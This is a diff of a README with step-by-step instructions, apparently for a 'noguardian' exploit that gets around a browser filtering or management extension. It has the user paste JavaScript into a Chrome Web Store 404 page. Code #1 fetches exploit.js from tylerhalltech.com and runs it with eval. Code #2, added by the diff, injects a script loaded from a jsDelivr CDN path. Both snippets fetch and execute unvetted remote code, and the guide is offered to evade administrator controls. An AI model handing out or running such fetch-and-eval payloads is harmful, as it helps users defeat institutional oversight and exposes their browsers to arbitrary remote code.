@@ -10,10 +10,17 @@ UPDATE: JUST GO HERE: https://tylerhalltech.com/noguardian.php
 ## 1) PREPARE EXPLOIT
 Copy the code here:
 
-## Code
+## Code #1
 ```
 fetch(`https://tylerhalltech.com/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
+
+## Code #2 (BETTER THAN #1)
+```
+(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
+```
+
+
 ## 2) LOAD 404 PAGE
 
 Go to `https://chrome.google.com/webstore_`
